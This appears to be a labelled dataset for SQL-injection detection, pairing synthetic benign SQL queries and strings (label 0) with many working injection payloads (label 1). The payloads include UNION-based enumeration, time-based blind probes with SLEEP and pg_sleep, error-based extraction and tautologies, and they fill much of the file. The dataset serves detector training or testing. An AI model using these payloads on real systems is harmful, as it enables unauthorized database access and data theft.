"x' AND userid IS NULL; --";1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm";1
1  )   union all select null,null,null,null,null,null,null,null,null,null#;1
"INSERT INTO logs (email, user_id, created_at, status) VALUES ('user123', 456, 'john@example.com', 'active');";0
SELECT * FROM toward FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM printed;0
SELECT vessels FROM of;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6;1
SELECT adult, just, slowFROM agree WHERE go  IS NOT NULL;0
SELECT Orders.sortrID, Employees.left, Employees.hurry FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.postID ORDER BY Orders.taughtID;0
select   (  case when   (  7978  =  6009  )   then 7978 else 1/  (  select 0  )   end  )  --;1
SELECT * FROM who ORDER BY suppose ASC, correctly DESC;0
SELECT TOP 3 * FROM knife SELECT * FROM wagon 3SELECT * FROM proper;0
ORDER BY 18#;1
SELECT * FROM something ORDER BY earth;0
"INSERT INTO sessions (created_at, email, name, user_id) VALUES ('pending', 123, 'active', 'user123');";0
a6ordab07;0
"UPDATE sessions SET created_at = 123 WHERE quantity = 123;";0
1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'wdru' like 'wdru;1
insert;1
"1"" and 9198  =  9198--";1
a3o1erada;0
21292;0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--;1
"1""   )    )    as ufba where 4049  =  4049";1
1' where 3900  =  3900 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --;1
select * from users where id  =  1 +1<@ union select version  (    )  ,version  (    )   -- 1;1
select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1;1
alvarez 35;0
contreras;0
1)) or sleep(5)#;1
SELECT happened ( s )  FROM occur SELECT wet ( s ) ;0
"1%"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""%""  =  """;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--;1
SELECT COUNT ( DISTINCT community )  FROM journey;0
mccarthy.darcy@tantomontamontatanto.jo;0
edlene;0
SELECT column_name ( s )  FROM laid,life;0
"UPDATE logs SET quantity = 'john@example.com' WHERE id = 'user123';";0
select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1;1
SELECT safe;0
1%'  )   and 9198  =  9198--;1
SELECT topicID AS ID, solve AS describe FROM mass;0
"DELETE FROM sessions WHERE created_at = 'active';";0
1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#;1
SELECT * FROM way WHERE vertical NOT LIKE 'member%';0
SELECT Employees.warm, COUNT ( Orders.twoID )  AS diagramFROM    ( OrdersINNER JOIN shadow ON Orders.pondID  =  Employees.norID ) ;0
milmarcos;0
712;0
SELECT AVG ( sea ) FROM differ SELECT SUM ( carefully ) ;0
SELECT warm ( s )  FROM animal UNION;0
"DELETE FROM sessions WHERE created_at = 'Sample text';";0
SELECT AVG ( Price ) FROM noted;0
1  )   as lisg where 5490  =  5490;1
1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ;1
SELECT * FROM she 3 SELECT * FROM further;0
replace;1
1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ;1
SELECT * FROM tail WHERE wet IN  ( 'court', 'birth', 'image' )  ;0
)   or   (  'x'  )    =    (  'x;1
UNION ALL SELECT 1,2,3,4#;1
raimondo;0
"SELECT user_id, status, description FROM inventory WHERE quantity = 'john@example.com';";0
SELECT got,author FROM might WHERE sand = 'journey' UNION SELECT including, hard FROM letter;0
1   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  4510  =  4510;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--;1
select * from users where id  =  '1' union select .%1,@@VERSION -- 1';1
-2375 union all select 1573,1573,1573,1573#;1
llombai;0
"DELETE FROM products WHERE created_at = 'user123';";0
-5859  )   as ernq where 8394  =  8394 union all select 8394,8394,8394--;1
group by userid having 1  =  1--;1
"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --";1
SELECT animal FROM first;0
1'  )   where 7587  =  7587 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
"SELECT user_id, name, quantity FROM products WHERE name = 'user123';";0
select * from users where id  =  1 or <   =  1 union select 1,@@VERSION -- 1;1
SELECT * FROM model WHERE find LIKE '%cloth%';0
1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'fgox' like 'fgox;1
almazn cayul;0
SELECT * FROM same WHERE    NOT simply = 'south';0
SELECT TOP 3 * FROM house WHERE naturally = 'area';0
SELECT * FROM brain WHERE meal = 'beat' FETCH FIRST 3 ROWS ONLY;0
select   (  case when   (  6615  =  3564  )   then 1 else 6615*  (  select 6615 from master..sysdatabases  )   end  )  --;1
"-3829%""  )   union all select 2218,2218,2218,2218,2218,2218,2218--";1
"DELETE FROM users WHERE description = 'john@example.com';";0
"DELETE FROM employees WHERE id = 'user123';";0
1   )    )     )   or sleep  (  5  )   and    (    (     (  2209  =  2209;1
SELECT * FROM bone WHERE ever NOT IN  ( 'planning', 'watch', 'label' )  ;0
)   or true--;1
"-6095""  )   as hygc where 8142  =  8142 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --";1
1'  )   as yyyb where 1705  =  1705 and   (  8770  =  6988  )  *6988--;1
pealara, 87;0
SELECT * FROM ran WHERE Price NOT BETWEEN 10 AND 20;0
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--;1
1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ;1
calle de piquer, 8,;0
SELECT COUNT ( DISTINCT energy )  FROM second;0
SELECT mouth, swimming, herself FROM dangerous WHERE leaving  IS NULL;0
"SELECT status, user_id, id FROM logs WHERE id = '2023-01-01';";0
SELECT * FROM floating WHERE magic NOT BETWEEN 'worse' AND 'conversation';0
"INSERT INTO logs (quantity, email, name, user_id) VALUES ('user123', '2023-01-01', '2023-01-01', '2023-01-01');";0
"1""  )   as ymto where 3453  =  3453";1
"1""   )    )    as frsd where 6475  =  6475 union all select null,null,null,null,null,null,null,null,null,null--";1
SELECT * FROM occur 3;0
"1%""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --";1
SELECT highest, grandmother+ ', ' + beat+ ' ' + pole+ ', ' + shop AS castle  FROM verb;0
SELECT vast ( s )  FROM queen UNION;0
SELECT * FROM riding  WHERE jungle = zoo;0
SELECT Orders.rootrID, Employees.symbol, Employees.fewer FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.contrastID ORDER BY Orders.shallID;0
SELECT * FROM mouth FETCH FIRST 50 PERCENT ROWS ONLY;0
SELECT * FROM  ( SELECT market FROM army ) ;0
INSERT INTO child  ( any, pony, experiment )  VALUES  ( 'produce', 'difficult', 'helpful' )  ;0
telma;0
"SELECT * FROM thy WHERE stems BETWEEN ""suit"" AND    ""breath""";0
1,94E+15;0
"DELETE FROM customers WHERE price = 'Sample text';";0
SELECT AVG ( however ) FROM hung;0
pastukhov@pecher.iq;0
SELECT TOP 3 * FROM percent WHERE satisfied = 'pack' SELECT * FROM hill;0
select * from users where id  =  '1' union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1';1
"1""  )   rlike   (  select   (  case when   (  5746  =  5367  )   then 1 else 0x28 end   )    )    and   (  ""hnnf"" like ""hnnf";1
1  )   rlike sleep  (  5  )   and   (  5724  =  5724;1
"1""  )   and   (  5452  =  6050  )  *6050 and   (  ""ciyc"" like ""ciyc";1
"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --";1
"INSERT INTO sessions (email, description) VALUES ('Sample text', 'john@example.com');";0
"DELETE FROM orders WHERE id = 'pending';";0
SELECT Orders.quicklyrID, Employees.about, Employees.deal FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.stoppedID ORDER BY Orders.divideID;0
" select * from users where id  =  1 or ""1{"" or 1  =  1 -- 1";1
SELECT * FROM read WHERE breathe = 'thus' FETCH FIRST 3 ROWS ONLY;0
if  (  3490  =  4920  )   select 3490 else drop function hlzt--;1
SELECT police ( s )  FROM luck SELECT not FROM exist;0
"UPDATE sessions SET email = 123 WHERE id = 'user123';";0
halliwil;0
" end and ""xlvn""  =  ""xlvn";1
SELECT AVG ( muscle ) FROM dangerous;0
1 where 4468  =  4468 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --;1
"' AND id IS NULL; --";1
ORDER BY 8;1
9e1an906;0
-6100'  )   as kvfc where 2377  =  2377 or 6872  =  6872--;1
SELECT * FROM something WHERE    NOT parallel = 'deer';0
SELECT * FROM compound WHERE smaller = 'consider'  AND City = 'mill';0
SELECT * FROM being ORDER BY said ASC, coal DESC;0
ezcurra lo cascio;0
SELECT MIN ( repeat )  AS chemical FROM rain;0
SELECT nice FROM arrive UNION ALL SELECT enemy FROM immediately ORDER BY such;0
"DELETE FROM customers WHERE name = 456;";0
SELECT * FROM office WHERE four IN  ( SELECT shelter FROM badly ) ;0
SELECT TOP 3 * FROM food WHERE begun = 'careful' SELECT * FROM milk;0
SELECT COUNT ( shine )  FROM poet;0
"1""  )   where 9570  =  9570 rlike   (  select   (  case when   (  1642  =  3686  )   then 1 else 0x28 end   )    )   --";1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6;1
SELECT AVG ( pattern ) FROM pink SELECT SUM ( soon ) ;0
begin dbms_lock.sleep  (  5  ) ;1
"SELECT * FROM prize WHERE had BETWEEN ""ice"" AND    ""asleep""";0
"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --";1
SELECT TOP 3 * FROM managed SELECT * FROM upon 3SELECT * FROM down;0
select   (  case when   (  5464  =  9350  )   then 5464 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--;1
SELECT AVG ( object )  FROM shot  SELECT SUM ( minerals ) ;0
"UPDATE inventory SET id = '2023-01-01' WHERE id = '2023-01-01';";0
SELECT TOP 3 * FROM rest WHERE halfway = 'couple' SELECT * FROM seldom;0
SELECT * FROM steam WHERE automobile = 'pen'  AND  ( electricity = 'instrument' OR ordinary = 'policeman' ) ;0
ORDER BY 2;1
1',  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ;1
car52lit7;0
SELECT * FROM seems FETCH FIRST 3 ROWS ONLY;0
"-3865""  )   where 3559  =  3559 union all select 3559,3559,3559,3559,3559,3559,3559--";1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#;1
"INSERT INTO inventory (quantity, status) VALUES ('john@example.com', 'Sample text');";0
rosset;0
-5134   )    )     )   or 8571  =  8571--;1
"INSERT INTO products (quantity, description, id) VALUES ('Sample text', '2023-01-01', 'active');";0
-9893' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'pbop'  =  'pbop;1
SELECT COUNT ( incomeID ) FROM introduced;0
SELECT dirt ( s )  FROM safe;0
-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd;1
SELECT AVG ( won ) FROM foreign;0
1,  (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4250  =  4250  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ;1
-1269' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'gohv' like 'gohv;1
"1%"" or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --";1
"-7295""  )   or 9323  =  9323#";1
SELECT * FROM action WHERE breath = 'chicken';0
1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'zxon' like 'zxon;1
10410049l;0
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ;1
"-8894%""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""%""  =  """;1
SELECT * FROM eleven  WHERE tried = labor;0
INSERT INTO rapidly  ( afraid, softly, depth )  VALUES  ( 'local', 'rise', 'exercise' )  ;0
SELECT * FROM expect WHERE nest BETWEEN '1996-07-01' AND '1996-07-31';0
SELECT introduced ( s )  FROM agree;0
"or username like char  (  37  )  ;";1
38348614r;0
SELECT * FROM torn WHERE addition LIKE '%hide%';0
SELECT becameID AS ID, common AS shoe FROM now;0
SELECT TOP 3 * FROM clearly WHERE enjoy = 'capital';0
hi' or 1  =  1 --;1
"UPDATE logs SET name = 'Sample text' WHERE name = 'user123';";0
select * from users where id  =  1 or +< or 1  =  1 -- 1;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#;1
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'iuki'  =  'iuki;1
1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #;1
select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1;1
min81t8;0
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""oyou""  =  ""oyou";1
6180;0
SELECT Employees.sugar, COUNT ( Orders.secretID )  AS situationFROM    ( OrdersINNER JOIN thrown ON Orders.morningID  =  Employees.butID ) ;0
SELECT easily ( s )  FROM earn UNION ALL;0
1   )    )    as smtf where 5829  =  5829;1
patchsqa;0
SELECT * FROM spent WHERE least = 'active' LIMIT 3;0
-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#;1
"DELETE FROM logs WHERE id = 123;";0
"DELETE FROM products WHERE id = 'active';";0
" select * from users where id  =  1 or ""1{"" or 1  =  1 -- 1";1
UPDATE won SET known =  'prepare', City =  'far' WHERE dust =  terrible;0
"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ";1
calle nueva de arriba, 111 9g;0
SELECT paragraph FROM carry;0
1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'gwew' like 'gwew;1
-2424  )   where 8132  =  8132 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --;1
-6045 or 8919  =  2827--;1
select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa;1
1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
yaonan;0
SELECT AVG ( widely ) FROM flame SELECT SUM ( nervous ) ;0
SELECT MIN ( here )  AS desk FROM toward;0
SELECT * FROM upward WHERE sound LIKE '%out%';0
SELECT COUNT ( rapidly ) FROM together;0
SELECT whispered ( s )  FROM care UNION ALL;0
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'bwka'  =  'bwka;1
SELECT * FROM once ORDER BY bee ASC, allow DESC;0
balitear;0
"1""   )    )    as rhea where 2982  =  2982 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --";1
